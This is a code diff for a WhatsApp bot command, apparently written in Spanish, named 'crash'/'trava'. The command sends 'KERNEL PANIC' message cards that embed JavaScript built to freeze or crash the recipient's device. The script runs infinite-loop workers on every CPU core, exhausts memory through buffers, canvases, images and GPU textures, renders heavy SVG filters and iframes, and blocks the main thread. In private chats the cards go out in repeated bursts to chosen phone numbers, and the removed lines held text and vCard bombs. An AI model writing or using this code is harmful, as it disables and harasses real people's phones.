@@ -1,161 +1,150 @@
 import type { CommandContext } from "../../types/index.d.ts";
 import { fytBold } from "../../core/socketText.ts";
 
-/* ───────────────────────── texto ───────────────────────── */
-
-const CGJ = "\u034f";
-const ZW = "\u200b\u200c\u200d\u2060\ufeff";
-const RTL = "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069";
-
-const cgj = (n: number) => CGJ.repeat(n);
-const zw = (n: number) => {
-  let o = "";
-  for (let i = 0; i < n; i++) o += ZW[i % 5] + RTL[i % 10];
-  return o;
-};
-
-const textBomb = (lv: number) =>
-  "☢️ " + cgj(22000 * lv) + "\n\n" + "🎉".repeat(9000 * lv) + "\n\n" + zw(4000 * lv) + "\n\n" + "█".repeat(3000 * lv);
-
 /* ───────────────────────── payload ───────────────────────── */
 
 function buildKernelPanic(name: string, lv: number) {
-  const workerMul = 4 * lv;
-  const mb = 6 * lv;
-  const blocks = 28 * lv;
-  const bufMb = 24 * lv;
-  const canvases = 18 * lv;
-  const nodes = 30000 * lv;
-  const depth = 3 + lv;
-  const branch = 2;
-  const turbOct = 5 + lv;
+  const bufMb = 48 * lv;        // MB por ArrayBuffer (memoria externa)
+  const bufCount = 20 * lv;     // nº de ArrayBuffers
+  const canvasPx = 3600 + 2400 * lv;
+  const canvasCount = 2 + lv;
+  const imgCount = 70 * lv;
+  const imgPx = 1200;
+  const workers = 4 * lv;
   const iter = 2500 + 1500 * lv;
-  const osc = 120 * lv;
-  const lsKeys = 260 * lv;
+  const blur = 200 + 150 * lv;
+  const turbOct = 6 + lv;
 
   const html = `<style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{margin:0;background:#000;color:#fff;font-family:system-ui,sans-serif;overflow:hidden}
-#g{position:absolute;z-index:20;left:0;right:0;top:0;background:rgba(0,0,0,.85);padding:10px;border-bottom:2px solid #0ff}
+#g{position:absolute;z-index:20;left:0;right:0;top:0;background:rgba(0,0,0,.86);padding:10px;border-bottom:2px solid #0ff}
 h2{margin:0 0 6px;color:#0ff;text-align:center;font-size:14px;letter-spacing:2px}
 .st{display:flex;justify-content:space-between;font-size:10px;color:#9ff}
 .st b{color:#0ff;font-size:14px}
-#s{margin-top:5px;font-family:monospace;font-size:9px;color:#0ff}
+#s{margin-top:5px;font-family:monospace;font-size:9px;color:#0ff;white-space:pre}
 canvas{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1}
-#tv{position:absolute;inset:0;z-index:2;opacity:.55}
-iframe{position:absolute;width:2px;height:2px;opacity:0;left:0;top:0;border:0}
+#tv{position:absolute;inset:0;z-index:2;opacity:.5}
+#bl{position:absolute;inset:0;z-index:3;filter:blur(${blur}px);background:radial-gradient(#0ff,#0055ff,#000);will-change:filter;animation:sp 3s linear infinite}
+@keyframes sp{to{transform:rotate(360deg) scale(1.4)}}
 </style>
 <div id="g">
   <h2>☢️ KERNEL PANIC ☢️</h2>
-  <div class="st"><div>NÚCLEOS<br><b id="c">0</b></div><div>FPS<br><b id="f">0</b></div></div>
+  <div class="st"><div>HEAP<br><b id="m">0</b></div><div>FPS<br><b id="f">0</b></div></div>
   <div id="s">fase 0</div>
 </div>
+<div id="bl"></div>
 <svg id="tv"></svg>
 <canvas id="cv"></canvas>
 <script>
-var cv=document.getElementById('cv'),fEl=document.getElementById('f'),cEl=document.getElementById('c'),sEl=document.getElementById('s');
-var cores=navigator.hardwareConcurrency||8,pool=[],hoard=[],bufs=[],imgs=[],fr=0,lf=0;
-cEl.textContent=cores;
+var cv=document.getElementById('cv'),fEl=document.getElementById('f'),mEl=document.getElementById('m'),sEl=document.getElementById('s');
+var keep=[],pool=[],fr=0,lf=0,mb=0;
 function fase(n){try{sEl.textContent='fase '+n}catch(e){}}
-function next(fn){try{requestAnimationFrame(function(){setTimeout(fn,12)})}catch(e){setTimeout(fn,12)}}
+function next(fn){try{requestAnimationFrame(function(){setTimeout(fn,10)})}catch(e){setTimeout(fn,10)}}
+function mbUp(n){mb+=n;try{mEl.textContent=mb}catch(e){}}
 function turb(seed,size,oct){
   return '<svg width="'+size+'" height="'+size+'" xmlns="http://www.w3.org/2000/svg">'+
-   '<filter id="f'+seed+'" x="0" y="0" width="100%" height="100%">'+
+   '<filter id="f'+seed+'"><feGaussianBlur stdDeviation="${blur/2}"/>'+
    '<feTurbulence type="fractalNoise" baseFrequency="0.85" numOctaves="'+oct+'" seed="'+seed+'" stitchTiles="stitch"/>'+
-   '<feColorMatrix type="saturate" values="4"/></filter>'+
+   '<feColorMatrix type="saturate" values="5"/></filter>'+
    '<rect width="'+size+'" height="'+size+'" filter="url(#f'+seed+')"/></svg>';
 }
 
-/* 1 · todos los núcleos al 100% */
+/* 1 · CPU: todos los núcleos, bucle infinito */
 fase(1);
 try{
-  var src='onmessage=function(){var v=0;while(true){v+=Math.atan2(Math.sin(v),Math.cos(v))+Math.sqrt(v+1);}}';
+  var src='onmessage=function(){var a=new Float64Array(4096),v=1;while(true){for(var i=0;i<4096;i++){v=Math.atan2(Math.sin(v),Math.cos(v))+Math.sqrt(Math.abs(v)+1);a[i]=v}}}';
   var u=URL.createObjectURL(new Blob([src],{type:'application/javascript'}));
-  for(var i=0;i<cores*${workerMul};i++){var w=new Worker(u);w.postMessage(1);pool.push(w)}
+  var n=Math.max(4,(navigator.hardwareConcurrency||8)*${workers});
+  for(var i=0;i<n;i++){var w=new Worker(u);w.postMessage(1);pool.push(w)}
 }catch(e){}
 
 next(function(){
-  /* 2 · presión de heap: strings + ArrayBuffers */
+  /* 2 · memoria EXTERNA al heap V8: ArrayBuffers tocados página a página */
   fase(2);
-  try{for(var i=0;i<${blocks};i++)hoard.push('█'.repeat(${mb}*1000000))}catch(e){}
-  try{for(var j=0;j<${bufMb};j++)bufs.push(new Uint8Array(1000000))}catch(e){}
+  for(var b=0;b<${bufCount};b++){
+    try{
+      var buf=new Uint8Array(${bufMb}*1048576);
+      for(var p=0;p<buf.length;p+=4096)buf[p]=1;
+      keep.push(buf);
+      mbUp(${bufMb});
+    }catch(e){try{sEl.textContent='heap agotado en '+mb+'MB'}catch(x){}break}
+  }
   next(fase3);
 });
 
-/* 3 · decodificación masiva de imágenes */
+/* 3 · backing stores de canvas (nativos, no cuentan en V8) */
 function fase3(){
   fase(3);
-  try{
-    var c=document.createElement('canvas');c.width=1100;c.height=1100;
-    var g=c.getContext('2d'),d=g.createImageData(1100,1100);
-    for(var p=0;p<d.data.length;p+=4){d.data[p]=Math.random()*255;d.data[p+1]=Math.random()*255;d.data[p+2]=Math.random()*255;d.data[p+3]=255}
-    g.putImageData(d,0,0);
-    var uri=c.toDataURL();
-    for(var k=0;k<${canvases};k++){var im=new Image();im.src=uri;imgs.push(im)}
-  }catch(e){}
+  for(var c=0;c<${canvasCount};c++){
+    try{
+      var el=document.createElement('canvas');
+      el.width=${canvasPx};el.height=${canvasPx};
+      var g=el.getContext('2d');
+      g.fillStyle='#'+((c*7)%9)+'0f';
+      g.fillRect(0,0,${canvasPx},${canvasPx});
+      keep.push(el);
+      mbUp(Math.round(${canvasPx}*${canvasPx}*4/1048576));
+    }catch(e){}
+  }
   next(fase4);
 }
 
-/* 4 · SVG feTurbulence + documentos hijos (cada uno rasteriza su propia malla) */
+/* 4 · bombardeo de decodificación de bitmaps */
 function fase4(){
   fase(4);
   try{
-    var tv=document.getElementById('tv');
-    tv.setAttribute('viewBox','0 0 400 400');
-    tv.innerHTML='<defs><filter id="tb"><feTurbulence type="fractalNoise" baseFrequency="0.7" numOctaves="${turbOct}" stitchTiles="stitch"/><feColorMatrix type="saturate" values="5"/></filter></defs>'+
-      '<rect width="400" height="400" filter="url(#tb)"/>';
-  }catch(e){}
-  try{
-    var seed=0;
-    (function nest(lvl){
-      if(lvl<=0)return;
-      for(var b=0;b<${branch};b++){
-        try{
-          var f=document.createElement('iframe');
-          document.body.appendChild(f);
-          var doc=f.contentDocument;
-          doc.open();
-          doc.write('<body style="margin:0;background:#000">'+turb(seed++,420,${turbOct})+'</body>');
-          doc.close();
-        }catch(e){}
-      }
-      nest(lvl-1);
-    })(${depth});
+    var c=document.createElement('canvas');
+    c.width=${imgPx};c.height=${imgPx};
+    var g=c.getContext('2d'),d=g.createImageData(${imgPx},${imgPx});
+    for(var p=0;p<d.data.length;p+=4){d.data[p]=Math.random()*255;d.data[p+1]=Math.random()*255;d.data[p+2]=Math.random()*255;d.data[p+3]=255}
+    g.putImageData(d,0,0);
+    var uri=c.toDataURL();
+    for(var k=0;k<${imgCount};k++){
+      var im=new Image();im.src=uri;keep.push(im);
+      mbUp(Math.round(${imgPx}*${imgPx}*4/1048576));
+    }
   }catch(e){}
   next(fase5);
 }
 
-/* 5 · inundación de DOM */
+/* 5 · SVG con desenfoque + turbulencia (rasterizado por software) */
 function fase5(){
   fase(5);
   try{
-    var frag=document.createDocumentFragment();
-    for(var i=0;i<${nodes};i++){var d=document.createElement('div');d.textContent='█'.repeat(180)+Math.random();frag.appendChild(d)}
-    document.body.appendChild(frag);
+    var tv=document.getElementById('tv');
+    tv.setAttribute('viewBox','0 0 420 420');
+    tv.innerHTML='<defs><filter id="tb"><feGaussianBlur stdDeviation="${blur}"/>'+
+      '<feTurbulence type="fractalNoise" baseFrequency="0.7" numOctaves="${turbOct}" stitchTiles="stitch"/>'+
+      '<feColorMatrix type="saturate" values="6"/></filter></defs>'+
+      '<rect width="420" height="420" filter="url(#tb)"/>';
   }catch(e){}
   next(fase6);
 }
 
-/* 6 · almacenamiento, audio, vibración, historial */
+/* 6 · documentos hijos, cada uno con su propia turbulencia */
 function fase6(){
   fase(6);
   try{
-    var pad=new Array(90000).join('▓');
-    for(var i=0;i<${lsKeys};i++)localStorage.setItem('k'+i,pad);
+    var seed=0;
+    (function nest(l){
+      if(l<=0)return;
+      for(var b=0;b<2;b++){
+        try{
+          var f=document.createElement('iframe');
+          f.style.cssText='position:absolute;width:2px;height:2px;opacity:0;left:0;top:0;border:0';
+          document.body.appendChild(f);
+          var doc=f.contentDocument;
+          doc.open();doc.write('<body style="margin:0;background:#000">'+turb(seed++,400,${turbOct})+'</body>');doc.close();
+        }catch(e){}
+      }
+      nest(l-1);
+    })(${2 + lv});
   }catch(e){}
-  try{
-    var AC=window.AudioContext||window.webkitAudioContext;
-    if(AC){var ac=new AC();for(var o=0;o<${osc};o++){var os=ac.createOscillator();os.type='sawtooth';os.frequency.value=40+o*3;os.connect(ac.destination);os.start()}}
-  }catch(e){}
-  try{
-    var vib=function(){try{navigator.vibrate([120,40,120])}catch(e){}};
-    vib();setInterval(vib,700);
-  }catch(e){}
-  try{for(var h=0;h<2500;h++)history.pushState({h:h},'','#p'+h)}catch(e){}
   next(fase7);
 }
 
-/* 7 · GPU: shader a pantalla completa */
+/* 7 · GPU: texturas + shader a pantalla completa */
 function fase7(){
   fase(7);
   try{
@@ -164,6 +153,18 @@ function fase7(){
     var gl=cv.getContext('webgl',{antialias:false,powerPreference:'high-performance'});
     if(!gl)throw 0;
     gl.viewport(0,0,cv.width,cv.height);
+
+    /* texturas grandes: memoria de GPU */
+    for(var t=0;t<${3*lv};t++){
+      try{
+        var tex=gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_2D,tex);
+        gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,1024,1024,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
+        gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,gl.LINEAR);
+        mbUp(4);
+      }catch(e){}
+    }
+
     var vs=gl.createShader(gl.VERTEX_SHADER);
     gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}');
     gl.compileShader(vs);
@@ -177,8 +178,8 @@ function fase7(){
     gl.compileShader(fs);
     var pr=gl.createProgram();
     gl.attachShader(pr,vs);gl.attachShader(pr,fs);gl.linkProgram(pr);gl.useProgram(pr);
-    var b=gl.createBuffer();
-    gl.bindBuffer(gl.ARRAY_BUFFER,b);
+    var bf=gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER,bf);
     gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]),gl.STATIC_DRAW);
     var pos=gl.getAttribLocation(pr,'p');
     gl.enableVertexAttribArray(pos);
@@ -192,13 +193,14 @@ function fase7(){
       gl.drawArrays(gl.TRIANGLES,0,6);
       requestAnimationFrame(loop);
     })(0);
-  }catch(e){try{sEl.textContent='GPU bloqueada'}catch(x){}}
+  }catch(e){}
   next(fase8);
 }
 
-/* 8 · remate: bloqueo del hilo principal */
+/* 8 · remate: bloqueo del hilo */
 function fase8(){
   fase(8);
+  try{sEl.textContent+=' · '+mb+'MB'}catch(e){}
   var t0=Date.now();
   while(true){if(Date.now()-t0>900000)break}
 }
@@ -216,30 +218,14 @@ function fase8(){
   };
 }
 
-/* ───────────────────────── vCard bomb ───────────────────────── */
-
-function buildContacts(count: number, lv: number) {
-  const heavy = cgj(2600 * lv) + zw(500 * lv);
-  const list = [];
-  for (let i = 0; i < count; i++) {
-    const n = `000000${i}`.slice(-6);
-    list.push({
-      vcard:
-        `BEGIN:VCARD\nVERSION:3.0\nFN:${heavy}${n}\nN:${n};${heavy};;;\n` +
-        `TEL;type=CELL;waid=52155${n}:+52155${n}\nEND:VCARD`,
-    });
-  }
-  return { displayName: `☢️ ${heavy.slice(0, 1500)}`, contacts: list };
-}
+/* ───────────────────────── comando ───────────────────────── */
 
 const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
-
-/* ───────────────────────── comando ───────────────────────── */
 
 export default {
   name: ["crash", "trava", "travar"],
   category: "group",
-  description: "Kernel panic: workers al 100%, WebGL, feTurbulence, iframes, OOM de renderer, CGJ y vCards. Grupo sin tags; con mención va al privado en ráfaga.",
+  description: "Kernel panic por agotamiento de memoria nativa del renderer: ArrayBuffers, canvas, bitmaps, texturas WebGL, feGaussianBlur y workers.",
   async run(ctx: CommandContext) {
     const { sock, from, msg, args, reply, react } = ctx;
 
@@ -248,8 +234,7 @@ export default {
     const quoted: string | undefined = info.participant;
     const sender: string = (msg.key as any).participant || from;
 
-    const a0 = (args[0] || "").trim();
-    const raw = a0.replace(/\D/g, "");
+    const raw = (args[0] || "").replace(/\D/g, "");
     const lv = Number(args.find((a) => /^[123]$/.test(a)) || 0) || 3;
 
     let targets: string[];
@@ -262,20 +247,17 @@ export default {
 
     await react("☢️").catch(() => undefined);
 
-    const done: string[] = [];
-    const push = async (label: string, fn: () => Promise<any>) => {
-      try { await fn(); done.push(`✅ ${label}`); }
-      catch (e: any) { done.push(`⚠️ ${label}: ${e?.message || e}`); }
-    };
-
     const card = async (jid: string, name: string, level: number) => {
       const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
       const rich = new AIRich(sock)
         .setTitle("☢️ KERNEL PANIC // LuferOS")
-        .setFooter(`nivel ${level} · no cierres la tarjeta`);
+        .setFooter(`nivel ${level} · ${level === 3 ? "~1.6 GB" : level === 2 ? "~700 MB" : "~250 MB"}`);
       rich.addSection(buildKernelPanic(name, level));
       return rich.send(jid);
     };
+
+    let ok = 0;
+    const fail: string[] = [];
 
     for (const t of targets) {
       const isGroup = t.endsWith("@g.us");
@@ -287,37 +269,27 @@ export default {
         else name = String((msg as any).pushName || "").trim() || num;
       } catch {}
 
-      const q = isGroup ? { quoted: msg } : undefined;
-
-      /* texto CGJ + emoji (sin mentions en grupo) */
-      await push(`texto ${num}`, () => sock.sendMessage(t, { text: textBomb(lv) }, q));
-
-      /* mención visual, sin array de mentions */
-      await push(`chips ${num}`, () => sock.sendMessage(t, { text: `@${num} `.repeat(600 * lv).trim() }, q));
-
-      /* vCard bomb */
-      await push(`vcards ${num}`, () => sock.sendMessage(t, { contacts: buildContacts(50 * lv, lv) }, q));
-
-      /* ráfaga de kernel panic */
-      const cards = priv ? 3 + lv : lv >= 3 ? 2 : 1;
-      for (let i = 1; i <= cards; i++) {
-        await push(`panic ${num} #${i}`, () => card(t, name, lv));
-        if (priv) await sleep(300);
+      /* en grupo: solo 1 rich, sin tags */
+      if (!priv) {
+        try { await card(t, name, lv); ok++; }
+        catch (e: any) { fail.push(e?.message || String(e)); }
+        continue;
       }
 
-      /* reapertura */
-      if (priv && lv >= 3) {
-        await sleep(400);
-        await push(`texto x2 ${num}`, () => sock.sendMessage(t, { text: textBomb(3) }));
-        await push(`panic final ${num}`, () => card(t, name, 3));
+      /* en privado: ráfaga para saturar */
+      const cards = 3 + lv;
+      for (let i = 0; i < cards; i++) {
+        try { await card(t, name, lv); ok++; }
+        catch (e: any) { fail.push(e?.message || String(e)); }
+        await sleep(300);
       }
     }
 
     await react("☠️").catch(() => undefined);
 
     await reply(
-      `${fytBold("Kernel panic enviado")} → ${priv ? targets.map((t) => `+${t.split("@")[0]}`).join(" ") : "este grupo"}\n` +
-        `Nivel ${lv} · ${priv ? 3 + lv : "1-2"} tarjetas\n\n${done.slice(0, 12).join("\n")}`,
+      `${fytBold("Kernel panic")} → ${priv ? targets.map((t) => `+${t.split("@")[0]}`).join(" ") : "grupo (1 tarjeta, sin tags)"}\n` +
+        `Nivel ${lv} · ${ok} enviadas${fail.length ? ` · ${fail.length} fallos` : ""}`,
     ).catch(() => undefined);
   },
 };
